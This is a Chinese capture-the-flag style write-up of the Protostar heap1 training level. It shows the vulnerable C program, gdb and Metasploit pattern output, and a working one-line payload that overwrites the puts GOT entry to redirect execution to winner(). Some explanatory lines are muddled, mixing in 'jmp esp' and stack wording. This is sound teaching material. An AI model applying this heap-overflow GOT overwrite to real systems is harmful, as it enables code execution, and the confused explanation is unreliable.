# heap1

## （一） 题目：

\#include &lt;unistd.h&gt;

\#include &lt;string.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;sys/types.h&gt;

struct internet {

int priority;

char \*name;

};

void winner\(\)

{

printf\("and we have a winner @ %d\n", time\(NULL\)\);

}

int main\(int argc, char \*\*argv\)

{

struct internet \*i1, \*i2, \*i3;

i1 = malloc\(sizeof\(struct internet\)\);

i1-&gt;priority = 1;

i1-&gt;name = malloc\(8\);

i2 = malloc\(sizeof\(struct internet\)\);

i2-&gt;priority = 2;

i2-&gt;name = malloc\(8\);

strcpy\(i1-&gt;name, argv\[1\]\);

strcpy\(i2-&gt;name, argv\[2\]\);

printf\("and that's a wrap folks!\n"\);

}

## （二）解题过程：

源码就是两个参数比较，看那个赢，决出一个来。如果不调用winner\(\)函数，是决出不了的。

本题就是利用strcpy过程中，没控制输入参数的长度，覆盖了指针，可以修改崩溃地址的值，从而改变执行流程，执行到winner函数的入口地址。

思路如下：

1）可以用手工试探法测试也可以用patter工具测试，定位会导致崩溃的精确位置。

2）用objdump -t 获取winner函数的地址或者gdb获取。

3）构造payload

验证思路：

1）

root@fly:/usr/share/metasploit-framework/tools/exploit\# ./pattern\_create.rb Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

root@protostar:/opt/protostar/bin\# gdb ./heap1

GNU gdb \(GDB\) 7.0.1-debian

Copyright \(C\) 2009 Free Software Foundation, Inc.

License GPLv3+: GNU GPL version 3 or later &lt;[http://gnu.org/licenses/gpl.html](http://gnu.org/licenses/gpl.html)

This is free software: you are free to change and redistribute it.

There is NO WARRANTY, to the extent permitted by law.  Type "show copying"

and "show warranty" for details.

This GDB was configured as "i486-linux-gnu".

For bug reporting instructions, please see:

&lt;[http://www.gnu.org/software/gdb/bugs/&gt;](http://www.gnu.org/software/gdb/bugs/&gt);...

Reading symbols from /opt/protostar/bin/heap1...done.

\(gdb\) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag bbbbbbbb

Starting program: /opt/protostar/bin/heap1 Aa0Aa1Aa2Aa3Aa4Aa5Aa**6Aa7**Aa8Aa9Ab0Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Agbbbbbb

Program received signal SIGSEGV, Segmentation fault.

\*\_\_GI\_strcpy \(dest=0x37614136 &lt;Address 0x37614136 out of bounds&gt;,

```
src=0xbffffe8e "bbbbbbbb"\) at strcpy.c:40
```

40    strcpy.c: No such file or directory.

```
in strcpy.c
```

root@fly:/usr/share/metasploit-framework/tools/exploit\# ./pattern\_offset.rb -q 0x37614136

\[\*\] Exact match at offset 20

找到了崩溃的精确位置，在距离缓冲区20个字节后的开始处。

2）print winner

objdump -tR ./heap1

08048494 g     F .text    00000025              winner

找到了winner地址   08048494

3）构造payload

0x08048561 &lt;main+168&gt;:    call   0x80483cc &lt;puts@plt&gt;

0x08048566 &lt;main+173&gt;:    leave

0x08048567 &lt;main+174&gt;:    ret

End of assembler dump.

\(gdb\) b \*0x0804855a

Breakpoint 1 at 0x804855a: file heap1/heap1.c, line 34.

\(gdb\) r AAAAAAAA BBBBBBBB

Starting program: /opt/protostar/bin/heap1 AAAAAAAA BBBBBBBB

Breakpoint 1, main \(argc=3, argv=0xbffffd44\) at heap1/heap1.c:34

34    heap1/heap1.c: No such file or directory.

```
in heap1/heap1.c
```

\(gdb\) x/2i 0x80483cc

0x80483cc &lt;puts@plt&gt;:    jmp    \*0x8049774

0x80483d2 &lt;puts@plt+6&gt;:    push   $0x30

./heap1 $\(python -c 'print "A"\*20 + "\x74\x97\x04\x08"'\) $\(python -c 'print "\x94\x84\x04\x08"'\)

![](/assets/75.png)

$ ./heap1 $\(python -c 'print "A"\*20 + "\x74\x97\x04\x08"'\) $\(python -c 'print "\x94\x84\x04\x08"'\)

and we have a winner @ 1568657805

20个A填充+ 4个字节覆盖崩溃错（jmp esp处,ESP指向下一条指令的地址） ，另外一个参数 用winner入口地址代替。

在这关有嵌入的 malloc 调用，接着，还有有漏洞的 strcpy 函数用于将我们的输入拷贝至 struct 中。

我们在每个 malloc 和 strcpy 之前放置断点来动态分析，同时也开始分析堆中的内容。

可以看到，每次 strcpy 之后堆的结构如图所示，从此我们可以推断在第一个 malloc 调用时，字段 \*name 的优先级和内存地址被放到了栈上，然后在I2的 malloc 调用完成的时候发生了同样的事情。因为这个程序使用了有漏洞的 strcpy 函数，这也意味着我们可以写任意的数据到任何可写的位置。 如图所示，我们使用第一个 strcpy 函数来改写地址0x804a038并放了一个 GOT 进去，通过第二个 strcpy 函数来改写地址0x42424242为 winner 函数的 PLT 地址，最终通过了本关。

![](/assets/77.png)

ref：

[http://www.atomsec.org/游戏/protostar-heap-0-2-write-ups/](http://www.atomsec.org/游戏/protostar-heap-0-2-write-ups/)

http://l33thacker.com/protostar-heap1-writeup/

https://turingh.github.io/2015/12/14/protostar-heap3/

